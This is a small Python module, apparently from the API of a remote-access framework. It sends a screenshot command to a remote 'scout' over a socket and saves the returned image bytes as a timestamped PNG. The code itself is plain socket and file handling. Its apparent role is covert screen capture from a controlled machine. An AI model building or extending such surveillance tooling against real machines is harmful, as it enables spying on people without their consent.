# API
# done
import os
import pyiris_api.library.modules.recv_all as recv_all
import pyiris_api.library.modules.send_all as send_all
from datetime import datetime


def main(self, sock, command):
    send_all.main(sock, command)
    self.log.inf('Waiting for raw screenshot data to arrive')
    raw_bytes = recv_all.main(sock)
    file_name = datetime.now().strftime('%Y-%m-%d_%H-%M-%S.png')
    if type(raw_bytes) == str:
        self.log.blank(raw_bytes)
        return {"status": "error", "message": "", "data": {"scout_output": raw_bytes}}
    else:
        with open(file_name, 'wb') as f:
            f.write(raw_bytes)
            self.log.pos('Wrote file to : ' + os.path.join(os.getcwd(), file_name))
            self.log.pos('Done')
            return {"status": "ok", "message": "", "data": {"scout_output": "[+]Wrote file to : " + os.path.join(os.getcwd(), file_name)}}
